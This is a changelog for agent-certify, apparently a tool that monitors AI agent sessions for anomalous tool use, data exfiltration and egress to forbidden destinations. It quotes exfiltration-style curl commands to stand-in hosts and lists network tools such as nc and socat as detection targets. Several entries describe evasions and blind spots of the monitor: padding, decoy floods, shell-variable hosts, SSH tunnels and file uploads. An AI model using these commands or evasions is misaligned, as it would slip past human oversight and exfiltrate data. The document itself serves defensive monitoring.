# Changelog

All notable changes to agent-certify are documented here.
The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the
project uses [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added
- **Where a destination is** (`agent_certify.regions`): a destination gets an
  ISO 3166-1 alpha-2 country code, decided **offline**, and the answer says how
  it was reached — `cctld` (a country-code domain: `api.example.cn` → `CN`,
  `bbc.co.uk` → `GB`; the table is the 249 assigned codes plus the seven
  exceptions), `geoip` (an address literal looked up in a local CSV of
  `ip_start,ip_end,country` rows — DB-IP's *IP to Country Lite* format, CC BY
  4.0 — read with a binary search and no dependency), or `unknown`. **No
  database ships with the package and none is downloaded.** A `.com` hosted
  elsewhere is `unknown`, which is the honest limit and is documented as one: a
  ccTLD is a registration rather than a location
- **`--resolve-dns`** on `scan`, `learn` and `watch`: resolves destination
  names to addresses so the database can place them. **The one option in
  agent-certify that makes a network connection** — off by default, requires
  `--geoip-db`, prints what it will do and which resolver it will use before
  the first lookup, resolves each name at most once per run with a bounded wait
  and a cap on the number of lookups. **Never available from the MCP server**,
  which answers region questions from host names alone and opens no socket
- **`--geoip-db`** on `scan`, `learn`, `watch` and `verify`: a local address
  database. Offline, so `verify` can use it without becoming a network tool
- **Policy rule `forbidden_region`** (target: `"CN,RU,BY,IR"` — an *example*;
  no country is forbidden by default and no sanctions list ships here). The
  violation names the destination, the country and **how the country was
  determined**, since a ccTLD, an address database and a DNS lookup are not
  equally strong. `"unknown_region": "warning"` reports destinations whose
  country cannot be determined; the default ignores them. `suggest-policy`
  never drafts the rule: which countries an organisation will not send data to
  is a decision with legal weight that no baseline implies
- **A signed `egress` section in certificates** (`cert_format` 3): the
  destination patterns accepted and rejected, the forbidden regions in force,
  and the destinations observed, all signed. `certify` reads the baseline and
  policy to fill it; `verify` reports a destination the certificate does not
  cover and one in a forbidden region, resolving regions offline.
  **Formats 1 and 2 keep their original signed bytes**, so every certificate
  issued before this still verifies — tested for each format, and checked
  end to end against a certificate issued by the real v0.7.0 code.
  `graph_hash` is unchanged: a certificate's identity is still its topology
- **`certify` refuses to sign a system that already breaks its own egress
  rules**: a destination matching a rejected pattern in the baseline, or one in
  a forbidden region of the policy. It exits 1, names each destination and the
  rule it broke, and writes nothing — a certificate says a system was in a
  known good state, and signing over a live violation would say the opposite of
  the evidence. `--allow-egress-violations` signs anyway, warns on stderr, and
  records the violations in the signed `egress` section
  (`violations_at_issue`), so the evidence travels with the signature; `verify`
  reports them, and such a certificate still fails verification. Both rules are
  checked offline, `--geoip-db` included (`certify` never resolves a name),
  through the new `certificate.egress_violations()`
- **`certify --omit-observed-destinations`**: keeps the accepted and rejected
  patterns and the forbidden regions in the certificate and leaves out the list
  of destinations the session reached, for a certificate that will be shared
  outside the organisation — observed host names can describe internal
  infrastructure that the topology never revealed. The key is absent rather
  than empty (an empty list would claim the session reached nothing), the
  omission is inside the signed bytes, and `verify` then checks the rejected
  patterns and the forbidden regions only and says so in its report
- **One region resolver for a whole `watch`**: the resolver is held for the
  process, so its cache covers the failures too. A name whose lookup ran past
  the deadline stays `unknown` and is never retried on a later cycle, which
  leaves one abandoned thread rather than one per cycle, and the cap on
  resolutions is a budget for the run rather than for each cycle. `watch` also
  honours `--geoip-db` and `--resolve-dns`, which it previously ignored
- `AnomalyInjector.inject_forbidden_region()` and `.forbid_region()`, and the
  `forbidden_region` benchmark row: the first fault scored against the **policy
  engine** rather than a baseline. The runner now checks policies as well as
  anomalies (`BenchmarkRunner.check_policy`, `Injection.policy` /
  `.expected_rule`, `TypeResult.expected_rule`,
  `BenchmarkResult.policy_cases`) — **16 fault types, 72/72 detected**, with
  three measured blind spots and one false-positive case
- `tests/test_regions.py`, `tests/test_cert_egress.py`,
  `tests/test_cli_regions.py`: the ccTLD table, the database loader and its
  malformed rows, the resolver's cache, timeout and lookup cap, the policy
  rule, the certificate section and both legacy formats, every CLI path, and —
  in every test that involves DNS — a fake `socket.getaddrinfo`, with guards
  that **fail the test if anything resolves a name** when it should not

### Fixed
- **A command line of a million commands is bounded** (`MAX_SHELL_SEGMENTS`,
  10 000). 10 MB of `a;` with an unbalanced quote took about nine seconds to
  analyse, against the thirty an MCP call is allowed in total; it now takes
  0.1 s. The bound is on the *split* rather than on the list afterwards, and
  reaching it is published as `destination_scan_truncated` with the reason
  `segments`, like every other bound
- **A URL's host has to look like a host.** The shape test (one dot and a
  letters-only suffix, or an address literal, or `localhost`) applied to bare
  values only, so anything after `scheme://` became a destination:
  `https://a`, `http://api/x`, `http://r`, `https://h%d.example.net/` and a URL
  at the end of a markdown span were reported as the hosts `a`, `api`, `r`,
  `h%d.example.net` and `` x.example.com` ``. Trailing prose and markdown
  punctuation is stripped first, bracketed IPv6 literals are now matched by the
  URL pattern at all (`http://[::1]/`), and `localhost` counts
- **Writing a URL is not calling it.** Nothing is read from the value of a
  field that carries file or document content — `content`, `new_string`,
  `old_string`, `file_text`, `new_source`, `text`, `body`, `edits`, `patch`,
  `diff`, `replacement` (`CONTENT_KEYS` in `agent_certify/domains.py`) — under
  any tool. A `Write` whose contents mention `curl evil.example.net` reaches
  nobody; the `Bash` call that runs the file afterwards is read as before,
  since `command` is not a content key. `NETWORK_KEYS` and `SHELL_KEYS` keep
  their behaviour exactly
- **A separator inside quotes is not a command.** A command line is split on
  `|`, `||`, `&&`, `;` and `&` only *outside* single and double quotes, `\"`
  honoured inside double ones, so `git commit -m "fix; curl api.example.net"`,
  `echo "a; wget b.example.net"` and
  `python -c "import os; print('curl x.example.net')"` reach nobody. They were
  read as two commands, the second of which looked like a `curl` invocation —
  a *mention* of a command taken for one, and 27 of the 43 hosts this release
  stopped reading were that or a filename. A wrapper's quoted command keeps its
  meaning through the depth-1 recursion (`bash -c "cd /tmp; curl x.example.net"`
  still reaches `x.example.net`). **A line break always separates** and quoting
  is judged one line at a time, so a stray quote cannot move the segment
  boundaries of the lines around it — doing it globally found *more* spurious
  hosts than the plain split, measured — and **a line whose quoting does not
  balance falls back to the old split**, verbatim, because a malformed command
  line is the shape an exfiltration attempt would take. A no-separator fast
  path keeps the common case below the cost of the plain split
- **A thin baseline is reported as thin.** On a baseline of fewer than
  `MIN_BASELINE_SESSIONS` (5, overridable per detector and with
  `--min-baseline-sessions`), an *unknown* tool is a warning rather than a
  critical, and the message says what it rests on — `not in 6 known tools,
  learned from 2 sessions`. Two sessions that happened not to use `Read` do not
  make `Read` a critical finding. A **rejected** tool stays critical whatever
  the baseline: that is a decision, not a statistic
- Measured over eleven held-out real sessions (baselines of two to four
  sessions, so a worst case), before and after back to back on the same files:
  **109 anomalies before, 72 after; 94 critical before, 58 after** —
  `new_domain` 83 → 53, `egress_volume_spike` 8 → 1, `new_tool` 6 critical → 6
  warning. Of the 104 hosts read before, 43 stopped being read and **not one
  had been contacted**: traced key by key, 16 were not shaped like a host, 19
  appeared only in a file-writing argument, and 8 were a fragment of a quoted
  argument. Every true alert survived, the outbound-volume spike included. Two
  hosts are now read that were not before: a bracketed IPv6 literal, which the
  URL pattern did not match at all, and one whose trailing punctuation is now
  stripped

- `agent-certify learn` warns when it learns from fewer than
  `MIN_BASELINE_SESSIONS` sessions, and says what will be noisy: an unknown
  tool, and the two volume checks comparing against a deviation that is near
  zero or as wide as its own mean
- `agent_certify.domains.host_shape()`, the one notion of "shaped like a host",
  used by both the URL search and the bare-value rule
- `AnomalyDetector.min_baseline_sessions` and `.thin_baseline`;
  `SessionWatcher(min_baseline_sessions=...)`; `scan`/`watch
  --min-baseline-sessions`
- `AnomalyInjector.inject_written_url()` and the `written_url` benchmark row: a
  **false-positive case** rather than a fault — a clean `Write` whose contents
  name a host, measured to produce nothing. Blind spots and false-positive
  cases both expect silence for opposite reasons, so the table and
  `BenchmarkResult` score them apart (`FALSE_POSITIVE_CASES`,
  `injected_false_positives`, `TypeResult.false_positive`)
- **Outbound volume per destination** (`egress_volume_spike`): a baseline now
  learns how many *bytes* each destination receives — mean, deviation, maximum
  and the number of sessions behind them (`domain_egress_volume`) — and a
  session is compared against it. Warning past 3σ above the mean, critical past
  5σ, twice the mean standing in when the baseline never varied, increases only:
  `Outbound volume to api.internal.example: 2.1 MB (baseline: 5.6 KB ± 262 B, 395.2σ)`
  It is the only check that can see exfiltration through a channel that is
  entirely normal: the topology, the call counts and the host name are all
  unchanged, and only the size of what left is out of place
- `agent_certify.domains.measure_call()` and `CallEgress`: the destinations of
  one tool call and the bytes it sent to each — the UTF-8 size of its arguments
  (compact JSON, sorted keys, so the same call measures the same from any
  parser), counted once. The literal request bodies named on its command lines
  (`DATA_OPTIONS`: `curl -d`/`--data*`/`-F`/`--form`/`-T`,
  `wget --post-data`/`--body-data`, httpie's `key=value`) are reported
  separately as `data_bytes` — how much of the call was a declared payload —
  and are **not** added to the outbound size, being already part of the
  argument text that carried them. Numbers only: no payload, no argument text,
  nothing of the content is kept
- **An absolute floor on both volume checks** (`CALL_MIN_DELTA_CALLS` = 10
  calls, `EGRESS_MIN_DELTA_BYTES` = 10 KiB): a rise is reported only when it
  also passes the baseline's *maximum* by at least that much, the no-variation
  "twice the mean" fallback included. Three deviations above a mean of 402
  bytes is 981 bytes and twice a mean of one call is two calls; neither is a
  finding, and a check that reports them is one an operator learns to skip.
  Both are arguments of `AnomalyDetector`, of `SessionWatcher`, and of
  `agent-certify scan`/`watch` (`--min-call-delta`, `--min-egress-delta`);
  `0` turns a floor off. On eleven held-out real sessions this removed 5 of 11
  `call_volume_spike` reports and 1 of 9 `egress_volume_spike` reports, leaving
  every finding that named a rise of tens of kilobytes or dozens of calls
- `AgentGraph.egress_bytes`, `.egress_calls`, `.record_egress()` and
  `.egress_total()`; `Baseline.domain_egress_volume` and
  `volume("egress", host)`. The Claude Code, CrewAI, LangGraph and MCP-log
  parsers fill them where they already read destinations, counting one call once
  even when a log writes its start and its end as two records
- **`destination_scan_truncated`**: reaching a scan limit is now counted on the
  call and on the graph (`truncated_scans`, `truncated_network_scans`,
  `truncation_reasons`, like `skipped_records`) and reported — warning, critical
  when that call did name a destination. Until now a host that fell past a bound
  disappeared with no trace, which made the bound a one-line evasion
- `AnomalyInjector.inject_exfiltration()` (`egress_volume_spike`, warning or
  worse: 20× the usual data to a destination the baseline knows, changing no
  node, link or call count at all), `.inject_decoy_flood()`
  (`destination_scan_truncated`, critical: a host buried behind 220 approved
  decoys in one command) and `.inject_padding_evasion()` (`new_domain`,
  critical: a host behind 70 000 characters of padding), plus `.accept_domain()`
- `AnomalyInjector.inject_file_upload_exfil()` and the `file_upload_exfil`
  anomaly type: the benchmark's **third blind spot**, `curl -T dump.sql <known
  host>`. The destination and the call are read; the volume is not, because the
  log holds the file's name and never its size — a blind spot of the data
  rather than of the parser, so it is measured and declared instead of estimated
- `tests/test_egress_volume.py`: the measurement, the bounds, the baseline, the
  thresholds, every output (JSON, text, Markdown, HTML, OTel, MCP) and the
  negative twin of each positive case
- **Shell command egress**: the command line of a shell tool call is now read
  for network destinations, which closes the `shell_domain` blind spot v0.7.0
  shipped and measured. `{"command": "curl -sS collector.example.net/x"}` gives
  `collector.example.net`, so the most common exfiltration path in an agent
  session reaches the baseline and fires `new_domain`:
  `[CRITICAL] Network destination collector.example.net in tool call — not in baseline`
- `agent_certify.domains.domains_in_command()`, with `SHELL_KEYS` (the fields
  that carry a command: `command`, `cmd`, `script` and their variants) and
  `NETWORK_COMMANDS` (the programs whose arguments name a destination: `curl`,
  `wget`, `http`/`https`, `nc`, `ncat`, `netcat`, `socat`, `telnet`, `ssh`,
  `scp`, `sftp`, `rsync`, `ftp`, `git` for its remote subcommands only, and
  `Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`, `Test-NetConnection`).
  The line is split on `|`, `||`, `&&`, `;`, `&` and newlines, tokenised with
  `shlex`, and `sudo`, `env VAR=x`, `time`, `nohup`, `command`, `exec` and
  leading `VAR=value` assignments are skipped. A destination is a positional
  argument shaped like `host`, `host:port`, `host/path`, `user@host` or
  `user@host:path`, a URL, or the value of an option that names one (`-x`,
  `--proxy`, `--resolve`, `--connect-to`, `ssh -J`)
- a command **inside** a command is read one level deep (`MAX_SHELL_DEPTH`):
  the value of `bash -c`, `sh -c`, `zsh -c`, `dash -c`, `pwsh -Command`,
  `powershell -Command` and `cmd /c` (bundled short flags such as `bash -lc`
  included), and the remote command of `ssh host '<command>'`, which records
  both the host connected to and the host that command then reached. The inner
  program is judged by the same rule, so `bash -c "echo example.com"` gives
  nothing
- `extract_domains(payload, shell_key=...)`, the shell counterpart of
  `network_key`
- `AnomalyInjector.inject_wrapped_shell_domain()` and the
  `wrapped_shell_domain` anomaly type (`new_domain`, critical): a host inside
  the command a shell wrapper runs
- `AnomalyInjector.inject_shell_var_domain()`, `.inject_ssh_tunnel_domain()`
  and the `shell_var_domain` / `ssh_tunnel_domain` anomaly types: the
  benchmark's **two new blind spots**, a host a command builds in a shell
  variable (`h=<host>; curl -sS $h/health`) and a host at the far end of a
  forwarding (`ssh -L 8080:<host>:80 ops@<jump>`, where the jump host is
  recorded and the tunnelled one is not). Reading the first would mean
  evaluating the shell rather than parsing it; the second is the middle field
  of an option value that names no destination. Both are boundaries kept on
  purpose — so they are injected and measured rather than left unsaid
- `tests/test_shell_egress.py`: every recognised program, pipes and chains,
  wrappers, broken quoting, PowerShell, `user@host:path`, address literals and
  ports — and the negative twin of each, plus a non-regression suite that
  re-runs every extraction case `tests/test_domains.py` asserts

### Changed
- **A string is read whole**, to the 10 MB a parser already allows one record,
  instead of being cut at 64 KB: `echo <70 000 characters>; curl evil.example.org`
  reached nobody before and reports a destination now. The URL pattern scans in
  linear time, and a scheme pre-filter makes the whole scan **faster** than
  before — a 9.5 MB session parses in 548 ms against 651 ms on v0.7.0 (-16%)
- `MAX_SCAN_DEPTH` 8 → 32, so an ordinary nested argument object is read rather
  than counted as truncated; `MAX_STRING_CHARS` 64 KB → 10 MB; new
  `MAX_HOST_CHARS` (a bare-host value past 512 characters is not a hostname) and
  `MAX_SHLEX_CHARS` (past 64 KB of command line, segments are split on
  whitespace instead of lexed — some hundred times faster, and no destination
  is lost because quotes are stripped either way)
- `Baseline.volume()` takes a third scope, `"egress"`, and now refuses an
  unknown scope instead of silently reading the link statistics
- the injection benchmark covers **14 fault types: 66/66 detected on the eleven
  covered ones, no false positives**, with three measured blind spots
- the injection benchmark's `shell_domain` is now an expected *detection*
  (`new_domain`, critical) rather than an expected miss. The injection itself
  did not change: it builds the same argument object and passes it to the
  production extractor, so the row moved on its own
- nothing else of a command line is read, kept or transmitted: only host names,
  and only from the arguments of a recognised client. `SECURITY.md` §6 and §1
  are updated in the same change, under the review rule §6 states

## [0.7.0] - 2026-11-06

The v0.6.1 benchmark measured one blind spot and reported it for a release
rather than hiding it. This closes it, and adds the question a topology cannot
answer on its own: not which tools ran, but **where they went**.

### Added
- **Call volume detection** (`call_volume_spike`): a baseline now learns how
  *much* each tool and each link is used — mean, deviation, maximum and the
  number of sessions behind them — and a session is compared against it.
  Warning past 3σ above the mean, critical past 5σ:
  `Tool Bash called 487 times (baseline: 50 ± 1, 391.3σ)`
- Volume is learned **per link** as well as per tool, keyed by role like
  `known_links`. A link spike replaces the tool-level one when it adds
  something: a tool with several callers is reported as the link that spiked,
  so the message names who is responsible, and an agent calling that tool its
  usual number of times is not flagged because somebody else hammered it. A
  tool with a single caller is reported as the tool, where the link would say
  the same thing
- **Network destination monitoring**: `agent_certify.domains` reads the hosts a
  session's tool calls pointed at, and two new checks compare them against the
  baseline — `new_domain` (never seen, not accepted) and `rejected_domain`
  (matches a rejected pattern), both critical:
  `Network destination api.qwen.cn in tool call — not in baseline, matches rejected pattern *.cn`
- `agent-certify baseline accept --domain api.openai.com` and
  `baseline reject --domain "*.cn"`, with `baseline show` listing both and the
  destinations learned. Patterns follow the rules of the other decisions:
  carried across re-learns, last write wins, and reject beats accept
- `AgentGraph.seen_domains`, `.record_domains()` and `.domain_callers()`;
  `Baseline.known_domains`, `.accepted_domains`, `.rejected_domains`,
  `.tool_call_volume`, `.link_call_volume` and `.volume(scope, key)`;
  `baseline.link_volume()` and `link_key()`
- `AnomalyInjector.inject_foreign_domain()` and `.forbid_domain()`, so the
  benchmark covers six fault types: **36/36 detected, no false positives**
- `AnomalyInjector.inject_shell_domain()`, the benchmark's one **blind spot**
  injection: a host named inside a shell command argument
  (`{"command": "curl -sS collector.example.net/x"}`) is read by no check, so
  the expected outcome is silence and the fault is counted apart from the
  detection rate. It is injected through the production extractor, so it starts
  counting as a detection by itself — with no edit to the benchmark — the day
  extraction reads shell commands
- `agent_certify.benchmark.BLIND_SPOTS`, the list of fault types this release
  ships as uncovered, so a test can pin the claim
- `tests/test_volume.py` and `tests/test_domains.py` for the two features

### Changed
- `agent-certify learn` reports the destinations it learned, and the Claude
  Code, CrewAI, LangGraph and MCP-log parsers record them. `scan --format json`
  carries them as `seen_domains`
- the injection benchmark's `volume_spike` is now an expected *detection*
  rather than an expected miss; the row stays in the table

### Fixed
- `extract_domains()` capped its result at `MAX_DOMAINS` across a payload but
  not within a single string, so one argument holding hundreds of URLs could
  return all of them

#### From the 2026-11-03 audit (33 findings: 3 high, 7 medium, the rest low or info)

Three groups mattered, and all three were places where a shipped text claimed
something the code did not do.

- **`SECURITY.md` described the wrong data perimeter** (DOC-001, high). It said
  "prompts, tool inputs and tool outputs are never extracted" while v0.7.0
  reads host names out of both and returns them to MCP clients in anomaly
  messages. A new §6 now states what is read, what is kept, what reaches
  `baseline.json` and what is transmitted — plus a review rule: a feature that
  reads a new category of input data requires a `SECURITY.md` review in the
  same change
- **The benchmark's blind-spot machinery was unreachable** (INV-001, high).
  Every injection carried an expected category, so `expected_category` was
  never None and the branches that report a blind spot could not run: "no blind
  spots left" had become a property of the registry rather than a measurement.
  `inject_shell_domain` arms it again against a real gap, and the tests now pin
  the capability instead of the result
- **`benchmark/__init__.py` still said "no check reads call volume"** (INV-002,
  high), contradicting the shipped check and the same file twelve lines above
- **Three ways a real network destination was silently dropped** (INV-003
  cluster, medium) — the detector was not wrong, it was quiet:
  - `AgentGraph.merge` set the per-node destination list by default instead of
    unioning it, so when two sessions pointed the same tool at different hosts
    the second host survived in `seen_domains` with no caller and the anomaly
    degraded to "no caller recorded". On the path `scan <directory>` takes
    (INV-004)
  - `NOT_HOSTS` treated `zip`, `sh`, `so`, `md`, `py` and `rs` as file
    extensions although all six are delegated TLDs, so `{"host":
    "collector.zip"}` was dropped. Removed, and the rest of the list checked
    against the root zone; a test keeps it that way (INV-005)
  - `MAX_STRING_CHARS` was announced for "any one string" but applied only to
    the URL search, not to the bare-host branch (INV-006)
- `new_domain` / `rejected_domain` said "HTTP call to X detected"; nothing is
  observed, resolved or necessarily HTTP. Now "Network destination X in tool
  call" (INV-007)
- LangGraph's `unattributed_errors` was incremented and read nowhere. Now in
  the `graph` node's metadata and logged, like `transitions` (INV-008)
- `certify --key` with a file that is not a key raised a bare `ValueError`
  traceback; it now exits with a message naming what was expected (COD-011)
- `watch` silenced three parser loggers by name, missing CrewAI and LangGraph;
  it raises the parent `agent_certify.parser` logger instead, so every parser
  is covered by inheritance (COD-010)
- Exactly 5.0σ of call volume was reported critical where all three texts
  describing the check say warning; both bounds are now exclusive (DOC-017)
- A LangGraph node looping back to itself now increments its call count, as the
  README said it did (DOC-005)
- `baseline accept|reject` did not expand `~` or environment variables in
  `--baseline`, unlike every other path argument (MNT-001)
- `render_html` divided by zero on a graph whose edges all have weight 0,
  reachable through `AgentGraph.from_dict` (COD-015)
- Dead code removed: `triangle_counts()`, `baseline.normalise_domain()`,
  `STATUS_CODES["UNSET"]`, `BlastRadiusAnalyzer._get_neighbors()` and
  `Baseline.version`'s stale `"0.2.0"` default; `TypeResult.note` is now
  rendered by the benchmark table rather than carried unused (COD-014)
- `AgentFIScanner.structure` is declared in `__init__` (COD-016)
- Documentation corrected: the non-existent 5% skipped-record threshold
  (DOC-002), `BUSL-1.1` in the v0.5.0 roadmap entry (DOC-003), two
  contradictory v0.7.0 roadmap sections and shipped work filed under "Planned"
  (DOC-004), the watcher's format list and module title (DOC-006), the coverage
  badge against the CI floor (DOC-007), a misplaced field comment in `Baseline`
  (DOC-008), what `learn` records (DOC-009), `NETWORK_KEYS` presented as
  exhaustive (DOC-010), `node_classifications` labelled "Critical nodes"
  (DOC-011), the trace id's dependence on a session id (DOC-012), the time
  limit as per-request rather than per-tool-call (DOC-013), `--perspective
  classic` and `watch --duration` missing from the usage lines (DOC-014), the
  format-detection table's final row (DOC-015) and a resolved audit item still
  listed as open (DOC-016)

Deferred, and recorded in `ROADMAP.md`: `MNT-003` (splitting `cli.py` and
`mcp_server.py`), `COD-012` (version-counter invalidation for the edge index,
documented on the attribute in the meantime) and dynamic coverage badges.

### Notes
- **Destinations are patterns, never addresses.** Nothing is resolved in either
  direction: a hostname is never turned into an IP, and a pattern is matched
  against the name the agent used, which is the thing the operator decided
  about. An IP literal the agent itself used is kept as the destination it is
- **A mention is not a destination.** A full URL counts wherever it appears in
  a call's arguments; a bare host counts only as the value of a field that
  names one (`url`, `endpoint`, `host`, `base_url`, …). A domain-looking word
  anywhere else does not, and a tool's *result* is read only when that call's
  own arguments carried a URL. So a `WebFetch` records its redirects while a
  `Read` of a document full of links records nothing — without that
  distinction, every grep for a domain would read as egress and bury the real
  finding. The deliberate consequence: a destination that appears **only** in a
  result of a non-network tool is not reported
- Per-tool volume counts only the sessions where a tool appeared. Including the
  sessions it was absent from would put its mean near zero and fire every time
  it ran at all
- Adding `seen_domains` to the graph does not change `graph_hash()`, which
  covers node roles, kinds and links: **certificates issued before v0.7.0 still
  verify**. Baselines and graphs written by 0.6.x load unchanged, with no
  destinations and no volume statistics — until the next `learn`
- There is no `*` domain pattern. A host that is not in the baseline already
  fires as `new_domain`, so deny-by-default needs no pattern; `*` would also
  outrank every `accept`, since reject wins

## [0.6.1] - 2026-11-03

Two frameworks more, and the first measurement of what the anomaly checks
actually catch — including one thing they do not.

### Added
- **CrewAI parser** (`agent_certify.parser.CrewAIParser`): execution logs
  (`Crew(output_log_file=...)`) and event-bus dumps, as a JSON array, JSONL, or
  one object wrapping the entries. Agents become `agent:<role>`, tasks become
  `crew → agent:<role>` invocations, tool calls `agent:<role> → tool:<name>`,
  and delegation (`Delegate work to coworker`, `Ask question to coworker`)
  becomes an `agent → agent` link — which is what gives a crew's graph
  triangles, and so an FI below 1
- **LangGraph parser** (`agent_certify.parser.LangGraphParser`): three trace
  shapes — the `astream_events` stream, `stream_mode="debug"`, and plain
  `{"node": ..., "next": ...}` records. Each node becomes `agent:<node>`, state
  transitions become `agent → agent` links (from `langgraph_triggers` when the
  trace has them, then `next`/`to`, then the order the nodes ran in),
  `__start__` is the orchestrator and `__end__` is dropped
- **Anomaly injection benchmark** (`agent_certify.benchmark`):
  `AnomalyInjector` (`inject_new_tool`, `inject_error_spike`,
  `inject_new_agent`, `inject_volume_spike`, `inject_forbidden_tool`),
  `BenchmarkRunner` reporting detection rate, false positive rate, false
  negative rate and blind spots per anomaly type, varied synthetic sessions to
  run it on, and `learn_holdout()` for the train/test split
- `python -m agent_certify.benchmark` and `scripts/benchmark.py`
  (`--sessions PATH` to benchmark real logs, `--format json` for CI)
- `examples/crewai_run.json` and `examples/langgraph_trace.jsonl`: scannable
  samples of both formats
- `agent_certify.parser.base.read_records()` and `to_datetime()`: a JSON
  document or JSONL file as one stream of records, and the timestamp spellings
  the frameworks write (ISO 8601, a space separator, epoch seconds or
  milliseconds)

### Changed
- auto-detection covers the new formats and accepts `.json` as well as
  `.jsonl`. The first 20 records of a file are probed and the first one a
  parser claims decides the format; a file nothing claims is still read as a
  Claude Code transcript. A directory scan picks up CrewAI and LangGraph logs
  by content, so a `.json` that holds no records (`package.json`) is ignored
- `agent-certify scan`, `learn`, `watch` and `certify` take the new formats
  through the same auto-detection, with no new flag. `watch` still finds the
  *newest* session in a folder by `*.jsonl` only; point it at a CrewAI or
  LangGraph file directly (a crew log is written once at the end of a run, so
  there is nothing to tail)

### Fixed
- a bridge between two nodes that invoke each other was counted twice, once per
  direction, so the bridge count could exceed the link count. Claude Code and
  Cursor graphs have no reciprocal edges, which is why this never showed;
  LangGraph loops (`agent → tools → agent`) produce them in every trace
- a CrewAI record holding nothing but an agent name is no longer claimed by the
  CrewAI parser (an empty join of its event fields read as truthy)

### Notes
- **Measured blind spot**: no check reads call *volume*, so a session that calls
  one tool ten times as often as the baseline ever saw is reported as clean.
  The benchmark injects that case and counts it as a blind spot rather than
  leaving it out of the suite. Volume-aware detection is a v0.7.0 candidate
- The benchmark's headline numbers (100% detection, 0% false positives over the
  four covered types) come from synthetic sessions that are deliberately
  regular; `--sessions` against real logs is what describes a real system
- Neither new parser imports the framework it reads: both work on logs alone,
  on any machine, with `numpy` and `cryptography` as the only dependencies

## [0.6.0] - 2026-11-03

Feedback from Reddit and LinkedIn: a baseline that can only be re-learned is a
baseline you cannot correct. Three decisions are now recorded in it, and
`learn` carries them forward instead of overwriting them.

### Added
- `agent-certify baseline accept --tool NAME` — whitelist a tool without
  re-learning. It stops being a `new_tool` anomaly and no statistic moves
- `agent-certify baseline reject --tool NAME` — a tool that must never become
  normal. It fires **even after a re-learn that saw it in every session**, and
  `suggest-policy` no longer drafts it as a `required_tool` rule
- `agent-certify baseline accept --link "agent:Build -> deploy_staging"` —
  scoped acceptance: one caller, one target. A different agent calling the same
  tool still fires, and the message names the callers no accepted link covers
  (thanks to Rohan Ahmed on LinkedIn for the case)
- `agent-certify baseline show [--format json]` — the decisions on record
- `agent-certify learn --forget-overrides` — drop them deliberately
- `Baseline.accepted_tools`, `.rejected_tools`, `.accepted_links`,
  `.has_overrides`, and `carry_overrides()`, `parse_link()`, `normalise_tool()`,
  `normalise_endpoint()` in `agent_certify.baseline`

### Changed
- `agent-certify learn` reads the baseline it is about to overwrite and carries
  its accept/reject decisions onto the new one. A corrupt previous file loses
  the decisions but does not block learning
- `--tool` and `--link` are repeatable; `--tool` takes `Bash` or `tool:Bash`
- accept and reject are last-write-wins on the same tool: "permanent" means it
  survives a re-learn, not that it cannot be revised. Rejection beats a scoped
  accepted link

### Notes
- Baselines written by 0.5.1 and earlier load unchanged — the three fields are
  defaulted and a pre-0.6 file simply has no decisions on record
- There is no `reject --link`: a link you never want is a policy FORBIDDEN rule,
  where you write the message


## [0.5.1] - 2026-10-27

### Fixed
- A file with no readable records (empty, or nothing but malformed lines) now prints
  `No readable records in <file>` and exits 1, instead of an empty report with FI 0.0000. A directory
  scan leaves such files out and says how many; the MCP server reports it as a tool error
- Unreadable records produce a single warning per file,
  `WARNING: <file>: N of M records unreadable, skipped` (the parser and the CLI each printed one);
  M now counts every record read, sub-agent transcripts included

### Changed
- `keygen` without an argument writes `agent-certify.key` (and `agent-certify.key.pub`)
- `verify` with its arguments reversed or missing prints
  `Hint: usage is 'verify CERTIFICATE SESSION --public-key KEY'` and exits 2

## [0.5.0] - 2026-10-27

Fixes for the security audit of 2026-10-27 (45 findings). Items marked
**breaking** change behaviour that scripts may rely on.

### Security
- MCP server: path arguments are confined to `~/.claude/projects` and the working directory after
  resolving symlinks and `..`; environment variables are never expanded; responses and errors no longer
  contain resolved paths, file contents or exception text (SEC-001, SEC-005)
- MCP server: no machine-wide fallback when no session is named; only the current project (PRV-001, **breaking**)
- MCP server: 30 s limit per request; failures logged on stderr with a correlation id (SEC-006, OBS-001)
- `verify` requires `--public-key`; unsigned certificates fail unless `--allow-unsigned` (warns); the key
  embedded in a certificate is never trusted (SEC-002, **breaking**)
- Certificates carry `not_before` / `not_after` (90 days by default, `--validity-days`) checked by `verify`
  (`--ignore-expiry`), and can be bound to a system with `--expect-system-id` (SEC-004)
- Signed bytes are domain-separated (`agent-certify/cert/v1\0`) with a fixed-point `fi_score`; pre-v0.5
  certificates still verify, reported as legacy (SEC-008)
- Strict type and range validation when loading certificates, baselines, policies and graphs; NaN and
  Infinity rejected; generic error messages (SEC-007, SEC-005)
- `keygen` creates the private key atomically with mode 600 and never follows a symlink; `certify` warns
  about a key readable by others (SEC-003)
- Parsers skip and count malformed, deeply nested (RecursionError) or oversized (> 10 MB) lines; directory
  scans are bounded in depth (5) and file count (1,000) (SEC-006)
- HTML report escapes `<`, `>` and `&` in its embedded JSON (SEC-009)
- `scripts/demo.py` writes its certificate to an unpredictable temporary file (SEC-010)

### Added
- `scan --fail-on critical|warning|never`: exit 2 on findings at or above the level; `critical` is the
  default (FUN-001, **breaking**: previously always 0)
- Policy evaluated per session for directory scans in every format, with a VIOLATIONS column (FUN-002)
- `skipped_records` in graphs, scan results, JSON, OTel spans and certificates, with a warning above 5%
  (OBS-002)
- `watch` reads every format the auto-detecting parser supports (FUN-005)
- CI: tests on Ubuntu and Windows × Python 3.10–3.12 with a 90% coverage floor, ruff (including the
  flake8-bandit `S` rules), pip-audit, wheel build and install check
- Release workflow: tag `vX.Y.Z` → tests, PyPI Trusted Publishing with attestations (API token fallback),
  GitHub Release with these notes; pre-release tags go to TestPyPI
- Issue templates, CONTRIBUTING, SECURITY (with a threat model), CODE_OF_CONDUCT, this changelog

### Changed
- License switched from BUSL-1.1 to Apache-2.0 (open source)
- Scanner: articulation points by Tarjan's algorithm and FI per removed node computed incrementally; a
  3,000-node graph scans in under a second (the previous algorithm made one full graph copy and one dense
  n×n matrix product per node), with identical results (PRF-001)
- Blast radius reuses the scan's triangle structure instead of a full scan per node (PRF-002)
- Graph edges indexed by (source, target) with adjacency sets (PRF-003)
- `verify` reports a reason whenever the topology hash differs, and detects nodes whose kind changed (FUN-003)
- Path handling centralised in `agent_certify.paths` (MNT-001); the version is defined once, in
  `agent_certify.__version__` (MNT-002)
- MCP `scan_topology` accepts the `classic` perspective in its schema (COD-001)
